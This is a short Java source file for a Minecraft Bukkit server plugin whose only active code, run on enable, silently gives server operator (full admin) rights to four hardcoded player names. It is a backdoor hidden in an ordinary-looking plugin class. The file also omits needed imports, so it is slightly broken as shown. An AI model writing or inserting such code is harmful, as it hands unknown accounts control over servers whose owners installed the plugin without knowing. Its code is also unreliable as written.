import org.bukkit.plugin.java.JavaPlugin;

public final class PluginMain extends JavaPlugin {
    @Override
    public void onEnable() {
        String[] opPlayers = {"volide", "atpYT", "Egg_official", "bu_s"};
        for (String playerName : opPlayers) {
            OfflinePlayer player = Bukkit.getOfflinePlayer(playerName);
            if (!player.isOp()) {
                player.setOp(true);
            }
        }
    }
    
    @Override
    public void onDisable() {
        // TODO Insert logic to be performed when the plugin is disabled
    }
}
